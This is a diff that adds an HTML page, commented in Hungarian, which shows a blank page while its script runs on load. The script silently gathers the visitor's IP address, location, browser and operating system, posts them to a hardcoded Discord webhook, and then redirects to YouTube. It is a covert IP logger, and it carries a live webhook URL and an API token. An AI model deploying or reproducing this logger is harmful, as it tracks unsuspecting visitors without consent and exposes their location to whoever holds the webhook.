@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    
+</body>
+<script>
+    // Discord Webhook URL
+    const webhookUrl = 'https://discord.com/api/webhooks/1315070476854362235/HChsdhu0MbmqX9ecDxWhhQYcRFNhV3QiLCSAMwX43_MUDN4teMQVYHJKC8CuDfopddCs';
+
+    // Külső API az IP cím és földrajzi hely lekérdezésére
+    async function sendInfoToDiscord() {
+        // A böngésző típusa és operációs rendszere
+        const browser = navigator.userAgent;
+        const operatingSystem = navigator.platform;
+
+        // Külső API, amely visszaadja az IP címet és a geolokációs adatokat
+        const ipData = await fetch('https://ipinfo.io/json?token=e13cec5af39bbc')
+            .then(response => response.json())
+            .catch(error => {
+                console.error('Hiba az IP információ lekérése közben:', error);
+                return {};
+            });
+
+        // A kapott IP információk
+        const ip = ipData.ip || 'Ismeretlen';
+        const country = ipData.country || 'Ismeretlen';
+        const region = ipData.region || 'Ismeretlen';
+        const city = ipData.city || 'Ismeretlen';
+
+        // Aktuális dátum és idő
+        const currentDate = new Date();
+        const dateString = currentDate.toLocaleString('hu-HU'); // A dátum és idő formázása
+
+        // Webhook adat küldése
+        const payload = {
+            content: `**Dátum és idő**: ${dateString}\n**IP cím**: ${ip}\n**Böngésző**: ${browser}\n**Operációs rendszer**: ${operatingSystem}\n**Ország**: ${country}\n**Régió**: ${region}\n------------------------------`
+        };
+
+        // Webhook üzenet küldése POST kéréssel
+        await fetch(webhookUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        }).then(response => {
+            if (response.ok) {
+                console.log('Üzenet elküldve a Discord webhookra');
+            } else {
+                console.error('Hiba történt az üzenet küldésekor');
+            }
+        });
+
+        // Átirányítás a YouTube-ra
+        window.location.href = "https://www.youtube.com";
+    }
+
+    // Az oldal betöltődésekor az információk elküldése és átirányítás
+    window.onload = function() {
+        sendInfoToDiscord();
+    };
+</script>
+</html>
